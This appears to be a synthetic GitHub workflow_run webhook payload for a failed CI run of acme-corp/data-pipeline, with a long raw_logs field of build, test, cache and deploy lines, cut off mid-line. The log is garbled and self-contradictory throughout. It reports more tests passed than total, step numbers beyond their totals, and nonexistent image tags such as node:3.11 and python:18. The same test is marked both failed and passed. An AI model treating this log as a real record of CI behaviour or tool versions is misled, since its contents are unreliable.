{
  "action": "completed",
  "workflow_run": {
    "id": 789,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "c999f7397611d2d918ef0064c8f751d22170e28a",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-11-22T12:19:53.260506Z",
    "updated_at": "2025-11-22T12:21:16.352597Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "charlie"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: upload_artifacts ===\nOK\nCache restored successfully (367MB)\nGET /health - 200 (41ms)\nCache miss for key-6512\nCompleted.\nStep 5/23: Testing\nReady.\nTest Suites: 9 passed, 47 total\nOK\n[12:19:53] DEBUG: Initializing service\nException: TypeError\nCreating production build...\nConnection established\nEnvironment: staging\n[12:19:53] INFO: Connecting to database\nWARNING: react has known vulnerabilities\nTest Suites: 22 passed, 29 total\nUploading artifact 'build' (26 files)\nConnecting to acme.corp:443...\nPulling image: node:3.11\nPushing to registry...\nAlready up to date.\nPushing to registry...\nCompiling utils/utils.go...\nCoverage: 75% statements, 71% branches\nPulling image: node:3.11\nLayer 2/15: COPY command\nSnapshots: 30 passed, 50 total\nCache saved successfully\nCompiling utils/service.java...\nNODE_ENV=test\nCompiling src/utils.go...\nCache hit for key-3757\nTLS handshake completed\nLayer 9/15: ENV command\nFinished.\nCache restored successfully (59MB)\nDone.\nCache saved successfully\nnpm notice: package.json updated\nGET /status - 204 (21ms)\nVerifying...\nFAILED: test_auth_login\nTLS handshake completed\n  PASS: test_auth_login (341ms)\nFetching submodules...\nInstalling prettier@5.15.8\nConnection established\nWARNING: eslint has known vulnerabilities\n[12:19:53] INFO: Starting build process\n\u2717 build failed with exit code 56\nWARNING: axios has known vulnerabilities\n[12:19:53] INFO: Cache refreshed\nLoading...\nGET /health - 204 (66ms)\nPOST /data - 201 (203ms)\nCoverage: 83% statements, 82% branches\nStep 18/15: Installing dependencies\nAlready up to date.\nInstalling lodash@4.9.9\nGenerating source maps...\nStep 1/15: Building\nnpm install: resolved 709 packages\nImage pulled successfully\nRan 133 tests in 57s\nOK\nArtifact uploaded: build.tar.gz (28MB)\n[12:19:53] DEBUG: Query executed in 53ms\n\u2717 build failed with exit code 49\nGET /api - 204 (36ms)\nInstalling jest@1.9.2\nWARNING: react has known vulnerabilities\nLoading...\nPulling image: node:3.11\nEnvironment: production\npip: Collecting eslint\n[12:19:53] INFO: Connecting to database\nStep 1/18: Installing dependencies\nCompiling utils/index.js...\n[12:19:53] DEBUG: Connection pool: 6 active\npip: Downloading eslint-1.5.tar.gz\npip: Installing build dependencies...\nHEAD is now at 9cd69a2\n[12:19:53] DEBUG: Connection pool: 5 active\nStep 19/25: Running migrations\n[12:19:53] INFO: Cache refreshed\nnpm notice: package.json updated\n[12:19:53] INFO: Request completed\npip install: Successfully installed webpack-1.2\nPushing to registry...\nNODE_ENV=development\nTransforming 942 files...\n[12:19:53] INFO: Starting build process\nPOST /data - 201 (97ms)\nCreating production build...\nCoverage: 89% statements, 91% branches\n\u2713 Task completed in 3353ms\nCompleted.\nHEAD is now at 8798a9e\npip: Downloading express-2.9.tar.gz\nTLS handshake completed\nArtifact uploaded: build.tar.gz (31MB)\nnpm notice: package.json updated\nCompleted.\nCache restored successfully (271MB)\nSnapshots: 21 passed, 2 total\nException: ValueError\n[12:19:53] DEBUG: Memory usage: 909MB\n[12:19:53] INFO: Cache refreshed\n  PASS: e2e/test_cache_hit.spec.js\nConnection established\nOK\nPushing to registry...\npip: Collecting lodash\n[12:19:53] INFO: Request completed\n[12:19:53] DEBUG: Connection pool: 19 active\nArtifact downloaded: 29MB\nMinifying main.js\n  PASS: integration/test_auth_login.spec.js\npip install: Successfully installed react-4.14\nNODE_ENV=production\nArtifact downloaded: 21MB\nChecking out main branch\npip install: Successfully installed axios-3.9\nOptimizing 90 modules...\n  PASS: test_api_health (168ms)\n[12:19:53] INFO: Starting build process\nArtifact uploaded: dist.zip (84MB)\n[12:19:53] INFO: Cache refreshed\nCache invalidated: build\nTests: 389 passed, 311 total\nStep 16/22: Testing\nReady.\n[12:19:53] WARN: Deprecated API usage\nCompiling utils/index.js...\nnpm install: resolved 734 packages\n\u2717 build failed with exit code 7\nCompiling lib/utils.go...\nWaiting...\nStep 4/16: Installing dependencies\nBuilding Docker image...\nnpm notice: package.json updated\nStep 14/22: Building\n[12:19:53] DEBUG: Connection pool: 4 active\nSwitched to branch 'hotfix/task-962'\nChecking out develop branch\nFAILED: test_auth_login\nPushing to registry...\n\u2713 Task completed in 1199ms\n\u2713 Task completed in 3855ms\nCompiling src/main.py...\nCompiling lib/utils.go...\npip: Installing build dependencies...\n[12:19:53] INFO: Cache refreshed\n\u2713 All checks passed\n[12:19:53] DEBUG: Connection pool: 15 active\n[12:19:53] DEBUG: Loading configuration\nCreating production build...\nTLS handshake completed\nPulling image: python:latest\nnpm install: resolved 106 packages\nUploading artifact 'dist' (44 files)\nReady.\nLoading...\nFAILED: test_api_health\n[12:19:53] INFO: Connecting to database\n\u2713 Task completed in 4366ms\nInstalling prettier@3.0.5\nTransforming 400 files...\nHEAD is now at 58df720\nTests: 151 passed, 96 total\nArtifact downloaded: 34MB\nEnvironment: production\nUsing Python 3.10\n[12:19:53] DEBUG: Loading configuration\n\u2713 All checks passed\nTests: 386 passed, 208 total\nCompiling src/service.java...\n[12:19:53] DEBUG: Connection pool: 1 active\nyarn add: Done in 5.98s\nCache miss for key-9716\nPOST /upload - 200 (184ms)\nConnection established\nConnecting to acme.corp:443...\nGET /status - 200 (59ms)\nNODE_ENV=development\npip install: Successfully installed webpack-3.14\nCompiling lib/utils.go...\nImage pulled successfully\n[12:19:53] INFO: Processing request\nSuccess!\nCache invalidated: dependencies\nPulling image: python:latest\nFetching submodules...\nCache miss for key-3002\nTest Suites: 44 passed, 49 total\nUsing Node.js 18.0.6\nSwitched to branch 'hotfix/task-167'\nCoverage: 85% statements, 83% branches\nPlatform: linux-x64\n[12:19:53] WARN: Deprecated API usage\nVerifying...\nTest Suites: 41 passed, 48 total\nUsing Node.js 19.20.2\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nHEAD is now at bba2c9a\nPulling image: node:18\nTLS handshake completed\n\u2717 build failed with exit code 93\nyarn add: Done in 1.80s\nUploading artifact 'coverage' (40 files)\nCache saved successfully\n[12:19:53] DEBUG: Memory usage: 1554MB\nProcessing...\nOK\nAlready up to date.\nStep 17/23: Testing\nEnvironment: test\nnpm install: resolved 808 packages\nPOST /upload - 200 (240ms)\npip: Downloading express-3.10.tar.gz\nnpm install: added 99 packages\nWARNING: eslint has known vulnerabilities\nLayer 5/13: COPY command\nCompleted.\nStep 19/17: Linting\nyarn add: Done in 5.8s\nTLS handshake completed\nTests: 266 passed, 178 total\n[12:19:53] WARN: Deprecated API usage\nAlready up to date.\nGenerating source maps...\nStep 12/15: Running migrations\nArtifact downloaded: 12MB\nGET /status - 201 (72ms)\nPulling image: alpine:latest\nnpm install: added 416 packages\nBundling runtime.css\nImage pulled successfully\nCache hit for key-1465\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: package.json updated\nyarn add: Done in 19.88s\n[12:19:53] INFO: Cache refreshed\nException: TypeError\nStep 17/20: Building\nCache hit for key-4938\nFAILED: test_db_connect\nOptimizing 97 modules...\nConnection established\nSwitched to branch 'hotfix/task-923'\nVerifying...\nFinished.\nLoading...\nCompiling utils/service.java...\n[12:19:53] INFO: Starting build process\nTime: 6.979s\n[12:19:53] DEBUG: Connection pool: 6 active\n\u2717 build failed with exit code 53\nStep 10/23: Linting\nnpm install: added 267 packages\nFAILED: test_db_connect\nCompiling components/service.java...\nImage pulled successfully\nnpm notice: package.json updated\n\u2713 Step 'test' succeeded\nInstalling eslint@3.8.9\nFinished.\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_api_health (152ms)\nVerifying...\nTime: 51.439s\nImage pulled successfully\n[12:19:53] DEBUG: Loading configuration\nUsing Node.js 17.13.2\npip: Downloading eslint-3.12.tar.gz\nUsing Python 3.12\nFinished.\nHEAD is now at 8a2502c\nCache invalidated: dependencies\n[12:19:53] DEBUG: Memory usage: 1181MB\nCompiling components/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:53] INFO: Starting build process\nHEAD is now at 536cefb\nTLS handshake completed\nnpm install: resolved 1500 packages\n=== Step upload_artifacts completed ===\n=== Step: save_cache ===\nGET /status - 200 (78ms)\n[12:19:53] INFO: Processing request\nnpm notice: created a lockfile\n  PASS: test_api_health (1ms)\nPushing to registry...\nUsing Python 3.10\n[12:19:53] WARN: Deprecated API usage\npip: Installing build dependencies...\nCache miss for key-7305\n[12:19:53] WARN: Deprecated API usage\nCache invalidated: build\nUsing Python 3.12\nCompleted.\nCache saved successfully\nUploading artifact 'build' (26 files)\nAlready up to date.\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache saved successfully\nUploading artifact 'coverage' (34 files)\nUsing Python 3.11\nGenerating source maps...\nFAILED: test_user_create\nCache invalidated: build\nSuccess!\nGenerating source maps...\nVerifying...\nPulling image: node:18\n\u2713 Step 'build' succeeded\nOK\n[12:19:53] DEBUG: Initializing service\nPushing to registry...\n\u2717 build failed with exit code 55\n\u2713 lint completed\n[12:19:53] WARN: Deprecated API usage\nCoverage: 95% statements, 63% branches\n[12:19:53] INFO: Cache refreshed\nCompiling utils/main.py...\nHEAD is now at 4196727\nPlatform: linux-x64\nWaiting...\nBuilding Docker image...\nStep 14/22: Running migrations\nImage pulled successfully\nStep 11/17: Linting\nCache miss for key-7147\nChecking out master branch\nTransforming 459 files...\nPlatform: darwin-arm64\nLoading...\n[12:19:53] ERROR: Connection failed\nProcessing...\n[12:19:53] DEBUG: Memory usage: 439MB\n\u2713 Step 'checkout' succeeded\n[12:19:53] WARN: Deprecated API usage\n[12:19:53] WARN: Deprecated API usage\n[12:19:53] DEBUG: Initializing service\nBundling main.js\nCache invalidated: build\nTransforming 655 files...\nPulling image: python:3.11\n\u2713 package completed\nCache saved successfully\nCreating production build...\nCompiling utils/index.js...\nFetching submodules...\nCache restored successfully (493MB)\n\u2713 lint completed\nUploading artifact 'build' (49 files)\nUsing Python 3.12\nCache miss for key-4852\nEnvironment: development\nVerifying...\nStep 17/17: Installing dependencies\nGenerating source maps...\nStep 15/15: Deploying\n  PASS: test_auth_login (191ms)\nFetching submodules...\nConnection established\nStep 3/19: Testing\nyarn add: Done in 26.78s\n[12:19:53] INFO: Processing request\nWARNING: react has known vulnerabilities\nLayer 8/9: ENV command\nOK\npip install: Successfully installed jest-2.10\nyarn add: Done in 26.24s\nWARNING: react has known vulnerabilities\nPulling image: alpine:18\nFetching submodules...\n[12:19:53] INFO: Cache refreshed\nFAILED: test_api_health\nEnvironment: development\nMinifying app.js\nCompiling components/app.ts...\npip: Downloading eslint-4.8.tar.gz\nStep 6/24: Testing\npip install: Successfully installed eslint-3.5\n\u2717 build failed with exit code 104\nPulling image: python:18\nPlatform: win32-x64\nPOST /api - 201 (38ms)\nCoverage: 80% statements, 72% branches\n[12:19:53] DEBUG: Query executed in 81ms\nLayer 10/15: RUN command\nMinifying main.js\nCompiling src/service.java...\nVerifying...\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nRan 104 tests in 52s\nBundling main.js\n[12:19:53] INFO: Connecting to database\nCache hit for key-2821\nImage pulled successfully\nConnection established\nUploading artifact 'dist' (27 files)\nUsing Node.js 17.14.1\nArtifact downloaded: 3MB\nnpm install: added 485 packages\nStep 14/20: Building\nCache hit for key-3605\nCache restored successfully (71MB)\nCompiling components/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:53] DEBUG: Initializing service\nArtifact uploaded: dist.zip (49MB)\nUsing Python 3.10\nTests: 195 passed, 224 total\n[12:19:53] WARN: Deprecated API usage\nProcessing...\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Step 'build' succeeded\nInstalling eslint@1.11.6\n  PASS: test_cache_hit (459ms)\n\u2713 All checks passed\n[12:19:53] WARN: Deprecated API usage\n[12:19:53] INFO: Processing request\nUploading artifact 'dist' (8 files)\nnpm notice: package.json updated\n[12:19:53] DEBUG: Initializing service\nUsing Python 3.9\nProcessing...\npip: Installing build dependencies...\nFinished.\npip: Downloading jest-4.1.tar.gz\nTests: 396 passed, 67 total\nStep 6/17: Building\npip: Downloading prettier-1.12.tar.gz\nCreating production build...\nTransforming 457 files...\nProcessing...\nAlready up to date.\nProcessing...\nPushing to registry...\nVerifying...\nMinifying vendor.js\nCache miss for key-1559\nVerifying...\nCache saved successfully\n[12:19:53] DEBUG: Connection pool: 17 active\n[12:19:53] WARN: Deprecated API usage\npip: Installing build dependencies...\nStep 14/23: Deploying\nWaiting...\nLoading...\nUploading artifact 'build' (42 files)\nBuilding Docker image...\nTime: 64.46s\n[12:19:53] WARN: Deprecated API usage\n\u2713 test completed\nGenerating source maps...\nOptimizing 55 modules...\nHEAD is now at 6baa367\npip: Downloading axios-3.2.tar.gz\nStep 1/24: Installing dependencies\npip: Downloading express-1.0.tar.gz\nTLS handshake completed\nTests: 357 passed, 314 total\nStep 3/25: Running migrations\n[12:19:53] INFO: Request completed\nUploading artifact 'dist' (23 files)\nOptimizing 16 modules...\nUsing Python 3.9\n[12:19:53] DEBUG: Loading configuration\nSwitched to branch 'bugfix/task-369'\nCache saved successfully\nUsing Node.js 20.7.9\nCreating production build...\nArtifact downloaded: 45MB\nWARNING: axios has known vulnerabilities\nOptimizing 10 modules...\nSuccess!\nArtifact downloaded: 26MB\n[12:19:53] INFO: Processing request\nInstalling prettier@4.11.6\nPulling image: python:3.11\n[12:19:53] DEBUG: Query executed in 28ms\nLayer 4/11: RUN command\n[12:19:53] DEBUG: Initializing service\nTests: 488 passed, 304 total\nConnecting to startup.dev:443...\n\u2713 Task completed in 214ms\nTests: 71 passed, 113 total\nPlatform: linux-x64\nStep 13/22: Building\n  PASS: e2e/test_cache_hit.spec.js\nStep 13/17: Installing dependencies\n[12:19:53] INFO: Connecting to database\nFinished.\nBuilding Docker image...\nStep 8/18: Building\n\u2713 Task completed in 3735ms\n[12:19:53] INFO: Cache refreshed\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:19:53] INFO: Processing request\n[12:19:53] ERROR: Connection failed\nGenerating source maps...\npip: Installing build dependencies...\n[12:19:53] ERROR: Connection failed\nCompiling src/app.ts...\nAlready up to date.\nStep 13/23: Deploying\nHEAD is now at b4dead2\nLoading...\nCache miss for key-8912\npip install: Successfully installed jest-3.11\n[12:19:53] DEBUG: Connection pool: 5 active\nWaiting...\nCompiling lib/handler.rs...\nyarn add: Done in 8.97s\npip: Downloading jest-4.6.tar.gz\n[12:19:53] WARN: Deprecated API usage\npip: Downloading eslint-1.4.tar.gz\nTime: 63.509s\n  PASS: test_api_health (479ms)\nTest Suites: 23 passed, 21 total\nSnapshots: 25 passed, 16 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFetching submodules...\nArtifact uploaded: dist.zip (34MB)\nUsing Python 3.10\nStep 10/24: Running migrations\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nUsing Node.js 15.0.5\nTest Suites: 41 passed, 10 total\n[12:19:53] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (11MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:53] DEBUG: Initializing service\nReady.\nCoverage: 93% statements, 84% branches\nStep 15/18: Running migrations\nSwitched to branch 'hotfix/task-242'\n[12:19:53] DEBUG: Connection pool: 4 active\nWARNING: webpack has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: unit/test_db_connect.spec.js\nStep 9/17: Building\nCache miss for key-7256\nFetching submodules...\nSnapshots: 19 passed, 2 total\n[12:19:53] DEBUG: Loading configuration\nUsing Python 3.11\n[12:19:53] DEBUG: Memory usage: 867MB\n[12:19:53] INFO: Starting build process\nFetching submodules...\nSwitched to branch 'feature/task-892'\nGET /api - 201 (59ms)\nSuccess!\n[12:19:53] DEBUG: Connection pool: 7 active\n[12:19:53] WARN: Deprecated API usage\nyarn add: Done in 4.41s\nOptimizing 93 modules...\nPOST /data - 200 (111ms)\n\u2713 Task completed in 2142ms\n[12:19:53] INFO: Request completed\nCache hit for key-7899\nNODE_ENV=development\npip install: Successfully installed prettier-3.15\nStep 14/20: Building\nImage pulled successfully\nInstalling eslint@3.17.4\n[12:19:53] DEBUG: Query executed in 9ms\nnpm notice: package.json updated\n=== Step save_cache completed ===\n=== Step: lint ===\nCompiling utils/app.ts...\nCompleted.\nStep 9/15: Testing\nStep 7/21: Running migrations\nVerifying...\nWaiting...\nPulling image: alpine:3.11\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2717 build failed with exit code 114\n[12:19:53] INFO: Cache refreshed\nConnection established\nTests: 420 passed, 418 total\nStep 2/16: Running migrations\nGET /status - 204 (9ms)\n\u2717 build failed with exit code 38\nTLS handshake completed\nBuilding Docker image...\nCoverage: 80% statements, 83% branches\nCompiling components/service.java...\nInstalling prettier@2.8.6\nConnecting to cloud.services:443...\nStep 15/16: Testing\nNODE_ENV=development\nFAILED: test_api_health\nnpm install: added 202 packages\nHEAD is now at 47f7b49\npip install: Successfully installed eslint-4.3\nPOST /upload - 200 (84ms)\nTLS handshake completed\n\u2713 package completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact downloaded: 50MB\nFinished.\nImage pulled successfully\nnpm install: resolved 941 packages\nTime: 29.958s\nFAILED: test_user_create\nHEAD is now at afa9ef0\nTime: 80.860s\nCompiling src/service.java...\nCache saved successfully\nStep 13/25: Installing dependencies\npip install: Successfully installed react-1.17\nRan 185 tests in 14s\n[12:19:53] INFO: Processing request\nArtifact downloaded: 33MB\nConnection established\nTLS handshake completed\n[12:19:53] INFO: Connecting to database\npip install: Successfully installed eslint-2.13\nFAILED: test_db_connect\n[12:19:53] INFO: Cache refreshed\n[12:19:53] INFO: Request completed\nSuccess!\nStep 12/24: Building\nStep 5/16: Building\n[12:19:53] DEBUG: Memory usage: 490MB\nWARNING: webpack has known vulnerabilities\nLayer 10/9: ENV command\nCache restored successfully (413MB)\nDone.\nTransforming 915 files...\nSwitched to branch 'bugfix/task-668'\nCoverage: 76% statements, 72% branches\nImage pulled successfully\nNODE_ENV=production\nTest Suites: 20 passed, 6 total\nPushing to registry...\npip: Downloading prettier-3.15.tar.gz\nRan 118 tests in 35s\nArtifact uploaded: dist.zip (43MB)\nUsing Node.js 16.5.7\nAlready up to date.\nCompiling utils/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling components/utils.go...\nnpm notice: created a lockfile\nMinifying vendor.js\nChecking out main branch\nImage pulled successfully\nBundling main.js\nBuilding Docker image...\nFetching submodules...\n  PASS: test_cache_hit (308ms)\npip install: Successfully installed eslint-5.7\nTime: 14.51s\nOK\nCompiling utils/service.java...\nBuilding Docker image...\nConnection established\n[12:19:53] DEBUG: Initializing service\n[12:19:53] WARN: Deprecated API usage\nCoverage: 98% statements, 74% branches\nLoading...\npip: Collecting lodash\nHEAD is now at da32558\nCache saved successfully\nAlready up to date.\nTest Suites: 28 passed, 15 total\npip: Installing build dependencies...\nTransforming 473 files...\nCompiling src/index.js...\nUploading artifact 'dist' (12 files)\nOptimizing 87 modules...\nBundling main.css\nBuilding Docker image...\nArtifact uploaded: build.tar.gz (42MB)\nTest Suites: 24 passed, 27 total\nCompiling src/app.ts...\nUsing Node.js 17.17.9\nSuccess!\nWARNING: lodash has known vulnerabilities\nCompiling lib/app.ts...\nTests: 245 passed, 321 total\n[12:19:53] DEBUG: Memory usage: 664MB\nStep 6/18: Building\nUploading artifact 'dist' (22 files)\nCompiling utils/app.ts...\nStep 5/21: Deploying\nStep 16/15: Building\nPOST /data - 202 (268ms)\n\u2713 Task completed in 4797ms\nCache invalidated: build\nChecking out master branch\n\u2713 Step 'checkout' succeeded\n[12:19:53] DEBUG: Initializing service\nBundling main.css\n[12:19:53] INFO: Request completed\nCompiling components/service.java...\nHEAD is now at e747922\nMinifying main.js\nCompiling src/app.ts...\nCache saved successfully\nReady.\nTests: 402 passed, 424 total\nTime: 35.110s\nStep 10/21: Installing dependencies\nArtifact uploaded: build.tar.gz (21MB)\nPOST /data - 201 (196ms)\nCompiling lib/index.js...\nBundling main.css\nRan 28 tests in 47s\nTest Suites: 9 passed, 24 total\nMinifying vendor.js\nTest Suites: 8 passed, 18 total\nArtifact uploaded: dist.zip (99MB)\nStep 19/18: Testing\npip install: Successfully installed jest-2.20\nnpm notice: package.json updated\nMinifying app.js\nConnection established\nArtifact uploaded: dist.zip (94MB)\n\u2713 All checks passed\nInstalling jest@1.14.3\nCache hit for key-5602\nHEAD is now at d3730ce\npip: Installing build dependencies...\nOptimizing 87 modules...\nProcessing...\nEnvironment: staging\nStep 2/16: Deploying\n[12:19:53] ERROR: Connection failed\n\u2713 deploy completed\n[12:19:53] ERROR: Connection failed\n\u2713 Step 'test' succeeded\nArtifact uploaded: dist.zip (3MB)\nArtifact uploaded: build.tar.gz (47MB)\nException: NullPointerException\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPOST /data - 201 (435ms)\nCache invalidated: node_modules\nGET /status - 201 (39ms)\nUsing Node.js 18.9.0\nTime: 120.652s\nLoading...\nSuccess!\nProcessing...\nChecking out develop branch\nStep 1/21: Deploying\nWARNING: eslint has known vulnerabilities\nStep 15/18: Installing dependencies\n\u2717 build failed with exit code 81\nCompiling lib/utils.go...\nConnecting to test.io:443...\n  PASS: integration/test_api_health.spec.js\nTests: 353 passed, 71 total\n  PASS: test_db_connect (441ms)\n[12:19:53] DEBUG: Memory usage: 219MB\nSwitched to branch 'hotfix/task-254'\nStep 15/15: Deploying\nWaiting...\nCreating production build...\nArtifact downloaded: 13MB\n  PASS: test_cache_hit (41ms)\nVerifying...\nCoverage: 79% statements, 92% branches\nGenerating source maps...\nCache miss for key-9520\n[12:19:53] INFO: Starting build process\npip: Downloading prettier-5.13.tar.gz\nTLS handshake completed\nnpm install: resolved 1855 packages\n[12:19:53] WARN: Deprecated API usage\nTransforming 567 files...\nLayer 7/11: RUN command\n[12:19:53] DEBUG: Loading configuration\n[12:19:53] WARN: Deprecated API usage\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPOST /upload - 200 (115ms)\n[12:19:53] ERROR: Connection failed\nProcessing...\nCache invalidated: dependencies\nTransforming 910 files...\nCreating production build...\nArtifact downloaded: 2MB\nWARNING: prettier has known vulnerabilities\nCoverage: 85% statements, 81% branches\nyarn add: Done in 18.80s\nCache miss for key-2792\n[12:19:53] WARN: Deprecated API usage\nInstalling react@4.12.4\nGET /api - 201 (21ms)\nOptimizing 29 modules...\nCache miss for key-8971\nImage pulled successfully\nCoverage: 75% statements, 78% branches\nConnection established\nPulling image: python:3.11\nnpm install: added 233 packages\n\u2713 Step 'test' succeeded\nUsing Node.js 16.10.6\n\u2713 Step 'build' succeeded\nSuccess!\nNODE_ENV=production\nCompiling utils/service.java...\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling utils/handler.rs...\n[12:19:53] DEBUG: Query executed in 1ms\nVerifying...\nMinifying app.js\nOK\nTest Suites: 8 passed, 37 total\nOK\nChecking out master branch\nStep 11/25: Testing\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache miss for key-6516\nCompiling components/index.js...\nProcessing...\nNODE_ENV=test\nPOST /api - 201 (326ms)\nHEAD is now at fdc1830\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 Step 'test' succeeded\nCache saved successfully\nCompiling components/index.js...\n[12:19:53] INFO: Cache refreshed\nNODE_ENV=test\nGenerating source maps...\nBundling main.js\n\u2713 All checks passed\nStep 3/23: Installing dependencies\n[12:19:53] DEBUG: Memory usage: 667MB\nArtifact uploaded: dist.zip (69MB)\nEnvironment: test\nSuccess!\nStep 11/16: Linting\nFetching submodules...\nBundling main.js\npip: Collecting express\n  PASS: integration/test_cache_hit.spec.js\n[12:19:53] INFO: Request completed\nImage pulled successfully\n[12:19:53] INFO: Request completed\nTime: 83.606s\nPOST /api - 201 (137ms)\nCache restored successfully (417MB)\nStep 6/20: Installing dependencies\nnpm install: resolved 824 packages\nProcessing...\nBundling main.js\nEnvironment: staging\n[12:19:53] INFO: Request completed\n[12:19:53] ERROR: Connection failed\nStep 13/15: Building\n=== Step lint completed ===\n=== Step: type_check ===\nNODE_ENV=development\nSwitched to branch 'bugfix/task-292'\npip: Installing build dependencies...\nCoverage: 86% statements, 60% branches\n[12:19:53] DEBUG: Loading configuration\nTransforming 394 files...\nArtifact uploaded: dist.zip (13MB)\n[12:19:53] DEBUG: Connection pool: 15 active\n\u2713 Step 'build' succeeded\nHEAD is now at d313a12\nSwitched to branch 'bugfix/task-315'\nFetching submodules...\nImage pulled successfully\nGenerating source maps...\nWARNING: webpack has known vulnerabilities\nnpm install: resolved 853 packages\nPOST /upload - 201 (390ms)\nUsing Python 3.9\nOK\npip install: Successfully installed lodash-1.16\nCache invalidated: build\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (29MB)\n\u2713 Step 'build' succeeded\nCoverage: 92% statements, 61% branches\nCache saved successfully\nStep 17/18: Testing\nInstalling axios@5.2.10\nArtifact uploaded: dist.zip (42MB)\n[12:19:53] ERROR: Connection failed\nRan 115 tests in 17s\n[12:19:53] INFO: Request completed\n[12:19:53] DEBUG: Memory usage: 250MB\nDone.\nGET /health - 201 (38ms)\nCache hit for key-3523\nCache hit for key-5261\nCreating production build...\n[12:19:53] DEBUG: Memory usage: 1875MB\n[12:19:53] DEBUG: Loading configuration\nSuccess!\nStep 15/17: Building\nArtifact uploaded: dist.zip (72MB)\n\u2713 Task completed in 1985ms\nImage pulled successfully\nTransforming 457 files...\nyarn add: Done in 22.31s\nOK\n[12:19:53] DEBUG: Memory usage: 1651MB\nCache hit for key-6632\n\u2713 build completed\nCache restored successfully (13MB)\nBuilding Docker image...\n  PASS: integration/test_auth_login.spec.js\nArtifact downloaded: 41MB\npip: Downloading axios-5.19.tar.gz\nTime: 6.754s\nCompiling components/index.js...\nnpm install: resolved 1571 packages\nFetching submodules...\nTransforming 938 files...\nnpm install: resolved 1127 packages\nStep 12/24: Building\nyarn add: Done in 29.34s\nTest Suites: 41 passed, 18 total\nUsing Node.js 16.16.8\n  PASS: test_user_create (472ms)\nBuilding Docker image...\nEnvironment: staging\n[12:19:53] INFO: Cache refreshed\nTLS handshake completed\nHEAD is now at d2401ac\nTest Suites: 21 passed, 11 total\nHEAD is now at dfa6451\nOptimizing 10 modules...\nFinished.\nTests: 404 passed, 253 total\nGET /status - 204 (95ms)\nSnapshots: 48 passed, 37 total\nChecking out master branch\nNODE_ENV=test\nArtifact uploaded: dist.zip (94MB)\nStep 5/18: Installing dependencies\nCache invalidated: build\nProcessing...\nFetching submodules...\nCache invalidated: node_modules\nCoverage: 94% statements, 66% branches\nPulling image: node:3.11\nTime: 112.313s\nDone.\n[12:19:53] DEBUG: Initializing service\nCache miss for key-5443\nBundling runtime.js\nnpm install: added 399 packages\nyarn add: Done in 27.47s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:53] WARN: Deprecated API usage\nTests: 259 passed, 123 total\nnpm notice: created a lockfile\nHEAD is now at 40be4fa\nCompiling utils/service.java...\n[12:19:53] DEBUG: Loading configuration\n[12:19:53] INFO: Connecting to database\nSwitched to branch 'hotfix/task-662'\nImage pulled successfully\n[12:19:53] INFO: Starting build process\nSuccess!\nCompiling components/index.js...\nDone.\n[12:19:53] WARN: Deprecated API usage\nPOST /upload - 200 (314ms)\nFinished.\n[12:19:53] INFO: Processing request\nSuccess!\n[12:19:53] INFO: Processing request\npip: Installing build dependencies...\n[12:19:53] INFO: Starting build process\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm install: added 498 packages\nHEAD is now at acdfcc3\nOK\nWARNING: express has known vulnerabilities\nException: RuntimeError\nCoverage: 82% statements, 67% branches\nPushing to registry...\n\u2713 Task completed in 2054ms\n  PASS: unit/test_api_health.spec.js\n\u2713 All checks passed\nLoading...\nStep 4/22: Building\nPulling image: python:18\n[12:19:53] DEBUG: Initializing service\nPlatform: linux-x64\nCache hit for key-4731\nTLS handshake completed\nOptimizing 77 modules...\nTransforming 261 files...\nImage pulled successfully\nStep 10/22: Deploying\nReady.\nArtifact uploaded: build.tar.gz (28MB)\nAlready up to date.\nFAILED: test_db_connect\nGenerating source maps...\nStep 7/22: Installing dependencies\nnpm install: added 220 packages\nTest Suites: 8 passed, 5 total\nTests: 445 passed, 295 total\nReady.\nFetching submodules...\nArtifact uploaded: build.tar.gz (36MB)\n[12:19:53] DEBUG: Loading configuration\nnpm install: resolved 1642 packages\nNODE_ENV=production\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nBundling main.css\nHEAD is now at 5273959\n[12:19:53] INFO: Starting build process\n[12:19:53] WARN: Deprecated API usage\nConnection established\nPulling image: node:latest\nNODE_ENV=test\nChecking out master branch\nCache saved successfully\nCache restored successfully (467MB)\nFAILED: test_user_create\nChecking out develop branch\nCoverage: 92% statements, 97% branches\n  PASS: unit/test_api_health.spec.js\nPulling image: node:18\nCache hit for key-3559\nnpm install: added 108 packages\nPushing to registry...\n[12:19:53] DEBUG: Initializing service\nNODE_ENV=test\nCreating production build...\nStep 3/19: Running migrations\nCache restored successfully (342MB)\nGET /api - 201 (82ms)\nMinifying vendor.js\nCoverage: 99% statements, 